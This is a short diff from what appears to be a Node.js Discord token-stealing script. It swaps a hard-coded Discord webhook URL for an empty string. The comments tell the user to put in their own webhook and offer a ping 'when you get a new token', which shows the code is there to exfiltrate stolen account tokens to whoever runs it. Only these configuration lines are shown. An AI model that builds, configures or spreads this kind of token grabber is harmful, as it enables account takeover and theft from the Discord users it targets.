@@ -3,7 +3,7 @@ var fs = require('fs');
 
 
 //Change the webhook to your own
-var WEBHOOK_URL = "https://canary.discord.com/api/webhooks/904576272364097536/4DxHD9ZRKj71tAB0_Mk3lKT0iYwUkZuRRG9efb6bs33svGzw-taeIolqwxYPVW4LybEF";
+var WEBHOOK_URL = "";
 
 //Set to true to ping @everyone when you get a new token
 var PING_ME = false;
